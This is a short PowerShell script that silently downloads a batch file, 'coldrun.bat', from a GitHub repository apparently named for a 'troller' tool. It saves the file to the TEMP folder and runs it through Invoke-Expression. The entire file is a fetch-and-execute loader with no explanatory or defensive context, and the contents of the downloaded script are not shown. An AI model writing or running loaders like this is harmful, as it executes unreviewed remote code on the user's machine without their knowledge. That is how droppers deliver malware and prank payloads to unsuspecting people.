# Define the command to download and run the batch script
$command = 'cmd /c curl -s "https://raw.githubusercontent.com/vexnity/troller-revamped/main/coldrun.bat" > "$env:TEMP\coldrun.bat" && "$env:TEMP\coldrun.bat"'

# Execute the command
Invoke-Expression -Command $command
